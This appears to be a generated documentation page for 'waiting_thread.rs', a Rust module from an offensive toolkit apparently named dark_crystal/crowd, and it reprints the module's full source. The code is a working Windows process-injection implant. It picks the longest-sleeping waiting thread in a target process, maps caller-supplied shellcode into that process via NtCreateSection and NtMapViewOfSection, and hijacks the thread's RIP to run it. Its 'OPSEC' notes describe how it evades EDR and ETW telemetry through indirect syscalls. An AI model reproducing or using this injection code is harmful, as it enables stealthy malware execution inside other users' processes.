# crowd -- waiting_thread.rs  (S TIER)

| Field | Value |
|-------|-------|
| **Source** | `src/dark_crystal/crowd/src/waiting_thread.rs` |
| **Lines** | 607 |
| **Tier** | S |
| **Cards** | T007-process-injection |
| **Role** | WaitingThread hijack |
| **Unsafe blocks** | 5 |

## Purpose

# crowd -- waiting_thread.rs  (S TIER)

## WaitingThread Hijacking -- WAIT-State Thread Injection

A thread-hijacking variant that ONLY targets threads in a WAIT state.
This drastically reduces crash risk compared to regular thread hijacking
because the context swap occurs exactly when the wait completes, targeting
deeply sleeping threads that are not in the middle of executing critical code.

### Technique
1. Open target process via NtOpenProcess (RecycledGate)
2. Enumerate threads via CreateToolhelp32Snapshot + Thread32First/Next
3. For each thread, query wait state via NtQueryInformationThread
(ThreadBasicInformation) -- look for WaitReason matching deeply-sleeping
states: DelayExecution, WrQueue, WrLpcReply, WrUserRequest, WrAlertByThreadId
4. Pick the best candidate: thread with the longest WaitTime
5. Write shellcode into target via Mapping Injection (NtCreateSection + NtMapViewOfSection)
6. Suspend the candidate thread (NtSuspendThread)
7. Save original RIP via NtGetContextThread
8. Set RIP to shellcode address (NtSetContextThread)
9. Resume thread (NtResumeThread) -- wakes from wait and executes shellcode

### OPSEC
- No new threads created
- No APC queued
- Shellcode delivered via section mapping (no NtWriteVirtualMemory)
- Target thread was deeply asleep -- no mid-execution register corruption
- Uses RecycledGate for all NT syscalls (ETW-TI sees ntdll origin)

### KWAIT_REASON targets (from ntddk.h, Windows 10/11)
- DelayExecution (4): from Sleep/NtDelayExecution -- deeply sleeping
- WrUserRequest (13): generic user-mode wait -- safe to hijack
- WrQueue (15): waiting on work queue -- idle worker
- WrLpcReply (17): waiting on LPC reply -- idle
- WrAlertByThreadId (36): NtWaitForAlertByThreadId -- modern sleep

## Constants

- `WAIT_REASON_DELAY_EXECUTION`: `u32` = `4`
- `WAIT_REASON_WR_USER_REQUEST`: `u32` = `13`
- `WAIT_REASON_WR_LPC_REPLY`: `u32` = `17`
- `WAIT_REASON_WR_QUEUE`: `u32` = `15`
- `WAIT_REASON_WR_ALERT_BY_THREAD`: `u32` = `36`
- `THREAD_STATE_WAITING`: `u32` = `5`
- `SPI_HEADER_SIZE`: `usize` = `256` — 0x100 on x86_64
- `SYSTEM_PROCESS_INFORMATION_CLASS`: `u32` = `5`
- `THREAD_ALL_ACCESS`: `u32` = `0x1FFFFF`

## Types

### struct `ThreadBasicInformation` (line 88)

### struct `SystemThreadInformation` (line 120)

### struct `WaitCandidate` (line 160)

## Public API

### `find_waiting_thread` `unsafe` (line 309)
```rust
pub unsafe fn find_waiting_thread(pid: u32) -> Result<(u32, usize)>
```
Find the best candidate thread (in WAIT state) for hijacking.

Returns `(tid, thread_handle)` where the handle has THREAD_ALL_ACCESS.
The caller is responsible for closing the handle via `NtClose`.

Selection criteria:
1. Thread must be in WAITING state (KTHREAD_STATE = 5)
2. WaitReason must be in the safe set (DelayExecution, WrQueue, WrLpcReply, etc.)
3. Prefer the thread with the highest WaitTime (longest sleeper = safest hijack)

### `inject` `unsafe` (line 358)
```rust
pub unsafe fn inject(target_pid: u32, shellcode: &[u8]) -> Result<()>
```
Inject shellcode by hijacking a WAIT-state thread in the target process.

Full sequence:
1. Open process (NtOpenProcess via RecycledGate)
2. Find best waiting thread (NtQuerySystemInformation + NtOpenThread)
3. Write shellcode via Mapping Injection (NtCreateSection + NtMapViewOfSection)
4. Suspend thread, swap RIP to shellcode, resume

The thread wakes from its wait and executes the shellcode directly.

## Internal Functions

- `nt_open_thread` (unsafe) (line 171)
- `nt_query_information_thread` (unsafe) (line 188)
- `query_process_threads` (unsafe) (line 211)
- `wait_reason_name` (line 564)

## Key Dependencies

- `use anyhow::{anyhow, Context, Result};`

## Full Source

```rust
//! # crowd -- waiting_thread.rs  (S TIER)
//!
//! ## WaitingThread Hijacking -- WAIT-State Thread Injection
//!
//! A thread-hijacking variant that ONLY targets threads in a WAIT state.
//! This drastically reduces crash risk compared to regular thread hijacking
//! because the context swap occurs exactly when the wait completes, targeting
//! deeply sleeping threads that are not in the middle of executing critical code.
//!
//! ### Technique
//! 1. Open target process via NtOpenProcess (RecycledGate)
//! 2. Enumerate threads via CreateToolhelp32Snapshot + Thread32First/Next
//! 3. For each thread, query wait state via NtQueryInformationThread
//!    (ThreadBasicInformation) -- look for WaitReason matching deeply-sleeping
//!    states: DelayExecution, WrQueue, WrLpcReply, WrUserRequest, WrAlertByThreadId
//! 4. Pick the best candidate: thread with the longest WaitTime
//! 5. Write shellcode into target via Mapping Injection (NtCreateSection + NtMapViewOfSection)
//! 6. Suspend the candidate thread (NtSuspendThread)
//! 7. Save original RIP via NtGetContextThread
//! 8. Set RIP to shellcode address (NtSetContextThread)
//! 9. Resume thread (NtResumeThread) -- wakes from wait and executes shellcode
//!
//! ### OPSEC
//! - No new threads created
//! - No APC queued
//! - Shellcode delivered via section mapping (no NtWriteVirtualMemory)
//! - Target thread was deeply asleep -- no mid-execution register corruption
//! - Uses RecycledGate for all NT syscalls (ETW-TI sees ntdll origin)
//!
//! ### KWAIT_REASON targets (from ntddk.h, Windows 10/11)
//! - DelayExecution (4): from Sleep/NtDelayExecution -- deeply sleeping
//! - WrUserRequest (13): generic user-mode wait -- safe to hijack
//! - WrQueue (15): waiting on work queue -- idle worker
//! - WrLpcReply (17): waiting on LPC reply -- idle
//! - WrAlertByThreadId (36): NtWaitForAlertByThreadId -- modern sleep

#![allow(dead_code)]

use anyhow::{anyhow, Context, Result};
use std::ffi::c_void;
use std::ptr::null_mut;

// ── KWAIT_REASON constants ────────────────────────────────────────────────────

// Values from ntddk.h KWAIT_REASON enum (Windows 10/11):
//   Executive=0, FreePage=1, PageIn=2, PoolAllocation=3, DelayExecution=4,
//   Suspended=5, UserRequest=6, WrExecutive=7, WrFreePage=8, WrPageIn=9,
//   WrPoolAllocation=10, WrDelayExecution=11, WrSuspended=12, WrUserRequest=13,
//   WrEventPair=14, WrQueue=15, WrLpcReceive=16, WrLpcReply=17,
//   WrVirtualMemory=18, WrPageOut=19, ...
//   WrAlertByThreadId=36
const WAIT_REASON_DELAY_EXECUTION:     u32 = 4;
const WAIT_REASON_WR_USER_REQUEST:     u32 = 13;
const WAIT_REASON_WR_LPC_REPLY:        u32 = 17;
const WAIT_REASON_WR_QUEUE:            u32 = 15;
const WAIT_REASON_WR_ALERT_BY_THREAD:  u32 = 36;

/// WaitReason values considered safe targets for hijacking.
/// Threads in these states are deeply idle and not executing user code.
const SAFE_WAIT_REASONS: &[u32] = &[
    WAIT_REASON_DELAY_EXECUTION,
    WAIT_REASON_WR_USER_REQUEST,
    WAIT_REASON_WR_LPC_REPLY,
    WAIT_REASON_WR_QUEUE,
    WAIT_REASON_WR_ALERT_BY_THREAD,
];

// ── Thread state constants ────────────────────────────────────────────────────

/// KTHREAD_STATE: Waiting = 5
const THREAD_STATE_WAITING: u32 = 5;

// ── THREAD_BASIC_INFORMATION structure ────────────────────────────────────────
//
// Layout from ntddk.h / ntapi crate:
// typedef struct _THREAD_BASIC_INFORMATION {
//     NTSTATUS ExitStatus;           // +0x00
//     PVOID    TebBaseAddress;       // +0x08 (aligned)
//     CLIENT_ID ClientId;            // +0x10 (UniqueProcess + UniqueThread)
//     ULONG_PTR AffinityMask;        // +0x20
//     KPRIORITY Priority;            // +0x28 (LONG)
//     LONG      BasePriority;        // +0x2C
// } THREAD_BASIC_INFORMATION;
//
// Size = 0x30 on x86_64.

#[repr(C)]
struct ThreadBasicInformation {
    exit_status:      i32,
    _pad0:            u32,          // alignment padding
    teb_base_address: usize,
    unique_process:   usize,        // CLIENT_ID.UniqueProcess
    unique_thread:    usize,        // CLIENT_ID.UniqueThread
    affinity_mask:    usize,
    priority:         i32,
    base_priority:    i32,
}

// ── SYSTEM_THREAD_INFORMATION (embedded in SYSTEM_PROCESS_INFORMATION) ────────
//
// We query per-thread via NtQuerySystemInformation class 5 (SystemProcessInformation).
// Each SYSTEM_PROCESS_INFORMATION contains an array of SYSTEM_THREAD_INFORMATION.
//
// typedef struct _SYSTEM_THREAD_INFORMATION {
//     LARGE_INTEGER KernelTime;      // +0x00
//     LARGE_INTEGER UserTime;        // +0x08
//     LARGE_INTEGER CreateTime;      // +0x10
//     ULONG         WaitTime;        // +0x18
//     PVOID         StartAddress;    // +0x20 (aligned)
//     CLIENT_ID     ClientId;        // +0x28 (UniqueProcess + UniqueThread)
//     KPRIORITY     Priority;        // +0x38 (LONG)
//     LONG          BasePriority;    // +0x3C
//     ULONG         ContextSwitches; // +0x40
//     ULONG         ThreadState;     // +0x44
//     ULONG         WaitReason;      // +0x48
// } SYSTEM_THREAD_INFORMATION;

#[repr(C)]
#[derive(Clone, Copy)]
struct SystemThreadInformation {
    kernel_time:       i64,
    user_time:         i64,
    create_time:       i64,
    wait_time:         u32,
    _pad0:             u32,         // alignment to 8
    start_address:     usize,
    unique_process:    usize,       // CLIENT_ID.UniqueProcess
    unique_thread:     usize,       // CLIENT_ID.UniqueThread
    priority:          i32,
    base_priority:     i32,
    context_switches:  u32,
    thread_state:      u32,
    wait_reason:       u32,
    _pad1:             u32,         // trailing alignment
}

// SYSTEM_PROCESS_INFORMATION header (variable-length, contains thread array)
//
// typedef struct _SYSTEM_PROCESS_INFORMATION {
//     ULONG          NextEntryOffset;    // +0x00
//     ULONG          NumberOfThreads;    // +0x04
//     ...                                // (working set, etc)
//     ULONG_PTR      UniqueProcessId;    // +0x50 (offset varies, use field)
//     ...
//     ULONG          HandleCount;        // various offsets
//     ...
//     SYSTEM_THREAD_INFORMATION Threads[1]; // at end of fixed header
// } SYSTEM_PROCESS_INFORMATION;
//
// Fixed header size before Threads[] = 0x100 on x86_64 (256 bytes).
// We parse manually because the struct is variable-length.

const SPI_HEADER_SIZE: usize = 256; // 0x100 on x86_64

// SystemProcessInformation class
const SYSTEM_PROCESS_INFORMATION_CLASS: u32 = 5;

// ── Thread wait candidate ─────────────────────────────────────────────────────

struct WaitCandidate {
    tid:         u32,
    wait_time:   u32,
    wait_reason: u32,
    thread_state: u32,
}

// ── NtOpenThread via RecycledGate ─────────────────────────────────────────────

const THREAD_ALL_ACCESS: u32 = 0x1FFFFF;

unsafe fn nt_open_thread(
    thread_handle: *mut usize,
    desired_access: u32,
    object_attributes: *mut c_void,
    client_id: *mut c_void,
) -> i32 {
    let args = [
        thread_handle as usize,
        desired_access as usize,
        object_attributes as usize,
        client_id as usize,
    ];
    crate::recycled::invoke(crate::resolve::compute_hash("NtOpenThread"), 4, &args)
}

// ── NtQueryInformationThread via RecycledGate ─────────────────────────────────

unsafe fn nt_query_information_thread(
    thread_handle: usize,
    info_class: u32,
    info: *mut u8,
    info_size: u32,
    return_length: *mut u32,
) -> i32 {
    let args = [
        thread_handle,
        info_class as usize,
        info as usize,
        info_size as usize,
        return_length as usize,
    ];
    crate::recycled::invoke(crate::resolve::compute_hash("NtQueryInformationThread"), 5, &args)
}

// ── Query thread wait state via NtQuerySystemInformation ──────────────────────
//
// NtQueryInformationThread(ThreadBasicInformation) does not expose WaitReason.
// To get WaitReason and WaitTime, we use NtQuerySystemInformation(SystemProcessInformation)
// which returns all threads per process with their full scheduling state.

unsafe fn query_process_threads(target_pid: u32) -> Result<Vec<WaitCandidate>> {
    // Start with 1 MB buffer, grow if STATUS_INFO_LENGTH_MISMATCH
    let mut buf_size: usize = 1024 * 1024;
    let mut buf: Vec<u8>;
    let mut ret_len: u32 = 0;

    loop {
        buf = vec![0u8; buf_size];
        let st = crate::recycled::nt_query_system_information(
            SYSTEM_PROCESS_INFORMATION_CLASS,
            buf.as_mut_ptr(),
            buf_size,
            &mut ret_len,
        );
        if st == 0 {
            break;
        }
        // STATUS_INFO_LENGTH_MISMATCH = 0xC0000004
        if st as u32 == 0xC0000004 {
            buf_size = (ret_len as usize).max(buf_size * 2);
            if buf_size > 256 * 1024 * 1024 {
                return Err(anyhow!("WaitingThread: SystemProcessInformation buffer exceeded 256 MB"));
            }
            continue;
        }
        return Err(anyhow!("WaitingThread: NtQuerySystemInformation failed: 0x{:08x}", st as u32));
    }

    // Walk the linked list of SYSTEM_PROCESS_INFORMATION entries
    let mut offset: usize = 0;
    let buf_len = ret_len as usize;

    loop {
        if offset + 8 > buf_len {
            break;
        }
        let entry_ptr = buf.as_ptr().add(offset);

        // Read NextEntryOffset (ULONG at +0x00)
        let next_entry_offset = *(entry_ptr as *const u32);
        // Read NumberOfThreads (ULONG at +0x04)
        let num_threads = *(entry_ptr.add(4) as *const u32);
        // Read UniqueProcessId (ULONG_PTR at +0x50 on x86_64)
        let pid_offset: usize = 0x50;
        if offset + pid_offset + std::mem::size_of::<usize>() > buf_len {
            break;
        }
        let unique_pid = *(entry_ptr.add(pid_offset) as *const usize) as u32;

        if unique_pid == target_pid && num_threads > 0 {
            // Found our process. Parse the thread array.
            let threads_offset = offset + SPI_HEADER_SIZE;
            let thread_size = std::mem::size_of::<SystemThreadInformation>();
            let mut candidates = Vec::new();

            for i in 0..num_threads as usize {
                let t_off = threads_offset + i * thread_size;
                if t_off + thread_size > buf_len {
                    break;
                }
                let ti = &*(buf.as_ptr().add(t_off) as *const SystemThreadInformation);
                let tid = ti.unique_thread as u32;

                // Only consider threads in WAITING state with safe wait reasons
                if ti.thread_state == THREAD_STATE_WAITING
                    && SAFE_WAIT_REASONS.contains(&ti.wait_reason)
                {
                    candidates.push(WaitCandidate {
                        tid,
                        wait_time: ti.wait_time,
                        wait_reason: ti.wait_reason,
                        thread_state: ti.thread_state,
                    });
                }
            }
            return Ok(candidates);
        }

        if next_entry_offset == 0 {
            break;
        }
        offset += next_entry_offset as usize;
    }

    Ok(Vec::new())
}

// ── Public API ────────────────────────────────────────────────────────────────

/// Find the best candidate thread (in WAIT state) for hijacking.
///
/// Returns `(tid, thread_handle)` where the handle has THREAD_ALL_ACCESS.
/// The caller is responsible for closing the handle via `NtClose`.
///
/// Selection criteria:
/// 1. Thread must be in WAITING state (KTHREAD_STATE = 5)
/// 2. WaitReason must be in the safe set (DelayExecution, WrQueue, WrLpcReply, etc.)
/// 3. Prefer the thread with the highest WaitTime (longest sleeper = safest hijack)
pub unsafe fn find_waiting_thread(pid: u32) -> Result<(u32, usize)> {
    let candidates = query_process_threads(pid)
        .context("WaitingThread: failed to enumerate process threads")?;

    if candidates.is_empty() {
        return Err(anyhow!(
            "WaitingThread: no thread in WAIT state found for PID {}",
            pid
        ));
    }

    // Pick the candidate with the longest WaitTime
    let best = candidates
        .iter()
        .max_by_key(|c| c.wait_time)
        .unwrap(); // safe: candidates is non-empty

    // Open the thread via NtOpenThread (RecycledGate)
    let mut h_thread: usize = 0;
    let mut cid = [0usize, best.tid as usize]; // CLIENT_ID { UniqueProcess=0, UniqueThread=tid }
    let mut oa: [usize; 6] = std::mem::zeroed();
    oa[0] = std::mem::size_of::<[usize; 6]>(); // Length field

    let st = nt_open_thread(
        &mut h_thread,
        THREAD_ALL_ACCESS,
        oa.as_mut_ptr() as *mut c_void,
        cid.as_mut_ptr() as *mut c_void,
    );
    if st != 0 || h_thread == 0 {
        return Err(anyhow!(
            "WaitingThread: NtOpenThread(TID {}) failed: 0x{:08x}",
            best.tid,
            st as u32
        ));
    }

    Ok((best.tid, h_thread))
}

/// Inject shellcode by hijacking a WAIT-state thread in the target process.
///
/// Full sequence:
/// 1. Open process (NtOpenProcess via RecycledGate)
/// 2. Find best waiting thread (NtQuerySystemInformation + NtOpenThread)
/// 3. Write shellcode via Mapping Injection (NtCreateSection + NtMapViewOfSection)
/// 4. Suspend thread, swap RIP to shellcode, resume
///
/// The thread wakes from its wait and executes the shellcode directly.
pub unsafe fn inject(target_pid: u32, shellcode: &[u8]) -> Result<()> {
    if shellcode.is_empty() {
        return Err(anyhow!("WaitingThread: empty shellcode"));
    }

    // ── Step 1: Open target process via NtOpenProcess (RecycledGate) ──────────
    let mut h_proc: usize = 0;
    {
        let mut cid = [target_pid as usize, 0usize]; // CLIENT_ID { UniqueProcess, UniqueThread=0 }
        let mut oa: [usize; 6] = std::mem::zeroed();
        oa[0] = std::mem::size_of::<[usize; 6]>();
        let st = crate::recycled::nt_open_process(
            &mut h_proc,
            0x1FFFFF, // PROCESS_ALL_ACCESS for section mapping
            oa.as_mut_ptr() as *mut c_void,
            cid.as_mut_ptr() as *mut c_void,
        );
        if st != 0 || h_proc == 0 {
            return Err(anyhow!(
                "WaitingThread: NtOpenProcess({}) failed: 0x{:08x}",
                target_pid,
                st as u32
            ));
        }
    }

    // ── Step 2: Find best waiting thread ─────────────────────────────────────
    let (tid, h_thread) = match find_waiting_thread(target_pid) {
        Ok(v) => v,
        Err(e) => {
            crate::recycled::nt_close(h_proc);
            return Err(e.context("WaitingThread: candidate search failed"));
        }
    };

    // ── Step 3: Mapping Injection — write shellcode into target ──────────────
    //
    // Create a shared section, map locally (RW), copy shellcode, unmap local,
    // then map into target (RX). No NtWriteVirtualMemory needed.

    let sc_size = shellcode.len();
    let mut max_size: u64 = sc_size as u64;
    let mut h_section: usize = 0;

    let st = crate::recycled::nt_create_section(
        &mut h_section,
        0xF001F,    // SECTION_ALL_ACCESS
        null_mut(),
        &mut max_size,
        0x04,       // PAGE_READWRITE
        0x08000000, // SEC_COMMIT
        0,          // No file backing
    );
    if st != 0 {
        crate::recycled::nt_close(h_thread);
        crate::recycled::nt_close(h_proc);
        return Err(anyhow!(
            "WaitingThread: NtCreateSection failed: 0x{:08x}",
            st as u32
        ));
    }

    // Map into our own process (RW) to write the shellcode
    let mut local_base: *mut c_void = null_mut();
    let mut local_size: usize = 0;
    let st_local = crate::recycled::nt_map_view_of_section(
        h_section,
        (-1isize) as usize, // NtCurrentProcess
        &mut local_base,
        0,                   // ZeroBits
        0,                   // CommitSize
        null_mut(),          // SectionOffset
        &mut local_size,
        1,                   // ViewUnmap
        0,                   // AllocationType
        0x04,                // PAGE_READWRITE
    );
    if st_local != 0 || local_base.is_null() {
        crate::recycled::nt_close(h_section);
        crate::recycled::nt_close(h_thread);
        crate::recycled::nt_close(h_proc);
        return Err(anyhow!(
            "WaitingThread: local NtMapViewOfSection failed: 0x{:08x}",
            st_local as u32
        ));
    }

    if local_size < sc_size {
        crate::recycled::nt_unmap_view_of_section((-1isize) as usize, local_base);
        crate::recycled::nt_close(h_section);
        crate::recycled::nt_close(h_thread);
        crate::recycled::nt_close(h_proc);
        return Err(anyhow!(
            "WaitingThread: mapped region too small ({} < {})",
            local_size,
            sc_size
        ));
    }

    // Copy shellcode into the shared section (local view)
    std::ptr::copy_nonoverlapping(shellcode.as_ptr(), local_base as *mut u8, sc_size);

    // Unmap local view (shellcode lives in the section object now)
    crate::recycled::nt_unmap_view_of_section((-1isize) as usize, local_base);

    // Map into target process (RX) — shellcode is now executable in the target
    let mut remote_base: *mut c_void = null_mut();
    let mut remote_size: usize = 0;
    let st_remote = crate::recycled::nt_map_view_of_section(
        h_section,
        h_proc,
        &mut remote_base,
        0,          // ZeroBits
        0,          // CommitSize
        null_mut(), // SectionOffset
        &mut remote_size,
        1,          // ViewUnmap
        0,          // AllocationType
        0x20,       // PAGE_EXECUTE_READ
    );
    // Section handle no longer needed
    crate::recycled::nt_close(h_section);

    if st_remote != 0 || remote_base.is_null() {
        crate::recycled::nt_close(h_thread);
        crate::recycled::nt_close(h_proc);
        return Err(anyhow!(
            "WaitingThread: remote NtMapViewOfSection failed: 0x{:08x}",
            st_remote as u32
        ));
    }

    // ── Step 4: Suspend thread, hijack RIP, resume ───────────────────────────

    let mut prev_suspend_count: u32 = 0;
    let st_suspend = crate::recycled::nt_suspend_thread(h_thread, &mut prev_suspend_count);
    if st_suspend != 0 {
        crate::recycled::nt_close(h_thread);
        crate::recycled::nt_close(h_proc);
        return Err(anyhow!(
            "WaitingThread: NtSuspendThread(TID {}) failed: 0x{:08x}",
            tid,
            st_suspend as u32
        ));
    }

    // Get full thread context (all registers)
    let mut ctx: winapi::um::winnt::CONTEXT = std::mem::zeroed();
    ctx.ContextFlags = winapi::um::winnt::CONTEXT_FULL;

    let st_get = crate::recycled::nt_get_context_thread(
        h_thread,
        &mut ctx as *mut winapi::um::winnt::CONTEXT as *mut c_void,
    );
    if st_get != 0 {
        // Resume thread before bailing (leave thread in original state)
        crate::recycled::nt_resume_thread(h_thread, &mut prev_suspend_count);
        crate::recycled::nt_close(h_thread);
        crate::recycled::nt_close(h_proc);
        return Err(anyhow!(
            "WaitingThread: NtGetContextThread(TID {}) failed: 0x{:08x}",
            tid,
            st_get as u32
        ));
    }

    // Save original RIP for diagnostics (not restoring -- shellcode takes over)
    let _original_rip = ctx.Rip;

    // Redirect RIP to shellcode in the target's address space
    ctx.Rip = remote_base as u64;

    let st_set = crate::recycled::nt_set_context_thread(
        h_thread,
        &mut ctx as *mut winapi::um::winnt::CONTEXT as *mut c_void,
    );
    if st_set != 0 {
        // Restore original RIP and resume on failure
        ctx.Rip = _original_rip;
        let _ = crate::recycled::nt_set_context_thread(
            h_thread,
            &mut ctx as *mut winapi::um::winnt::CONTEXT as *mut c_void,
        );
        crate::recycled::nt_resume_thread(h_thread, &mut prev_suspend_count);
        crate::recycled::nt_close(h_thread);
        crate::recycled::nt_close(h_proc);
        return Err(anyhow!(
            "WaitingThread: NtSetContextThread(TID {}) failed: 0x{:08x}",
            tid,
            st_set as u32
        ));
    }

    // Resume the thread -- it wakes from its wait and executes the shellcode
    crate::recycled::nt_resume_thread(h_thread, &mut prev_suspend_count);

    // Cleanup handles
    crate::recycled::nt_close(h_thread);
    crate::recycled::nt_close(h_proc);

    Ok(())
}

// ── Helper: human-readable wait reason name (for diagnostics/mega-debug) ─────

#[allow(unused)]
fn wait_reason_name(reason: u32) -> &'static str {
    // Values from ntddk.h KWAIT_REASON (Windows 10/11 22H2+)
    match reason {
        0  => "Executive",
        1  => "FreePage",
        2  => "PageIn",
        3  => "PoolAllocation",
        4  => "DelayExecution",
        5  => "Suspended",
        6  => "UserRequest",
        7  => "WrExecutive",
        8  => "WrFreePage",
        9  => "WrPageIn",
        10 => "WrPoolAllocation",
        11 => "WrDelayExecution",
        12 => "WrSuspended",
        13 => "WrUserRequest",
        14 => "WrEventPair",
        15 => "WrQueue",
        16 => "WrLpcReceive",
        17 => "WrLpcReply",
        18 => "WrVirtualMemory",
        19 => "WrPageOut",
        20 => "WrRendezvous",
        21 => "WrKeyedEvent",
        22 => "WrTerminated",
        23 => "WrProcessInSwap",
        24 => "WrCpuRateControl",
        25 => "WrCalloutStack",
        26 => "WrKernel",
        27 => "WrResource",
        28 => "WrPushLock",
        29 => "WrMutex",
        30 => "WrQuantumEnd",
        31 => "WrDispatchInt",
        32 => "WrPreempted",
        33 => "WrYieldExecution",
        34 => "WrFastMutex",
        35 => "WrGuardedMutex",
        36 => "WrAlertByThreadId",
        37 => "WrDeferredPreempt",
        _  => "Unknown",
    }
}

```